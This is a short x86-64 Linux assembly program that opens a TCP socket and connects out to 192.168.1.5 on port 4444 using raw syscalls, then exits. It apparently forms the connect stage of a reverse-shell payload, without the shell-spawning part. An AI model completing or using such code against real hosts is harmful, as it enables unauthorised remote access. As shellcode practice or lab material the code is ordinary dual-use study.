section .bss
  s resb 8
  buf resb 32
  port resb 16
  server resb 16
section .text
  global _start
    _start:
        call main
	call exit
    main:
        push rbp
        mov rbp,rsp
        mov rdx, 0
        mov rsi, 1
        mov rdi, 2
        mov rax, 41
        syscall
        mov [s], rax
        mov word [server], 0x2
        mov dword [server+4], 0x501a8c0 ; 192.168.1.5
        mov word [port], 0x5c11 ; 4444
        movzx rax, word[port]
        mov word [server+2], ax
        mov rax, [s]
        mov rdx, 0x10
        lea rsi, [server]
        mov rdi, rax
        mov rax, 42
        syscall
	mov rax, 0
	pop rbp
	ret

    exit:
	mov    rax, 60
	mov    rdi, 0
	syscall

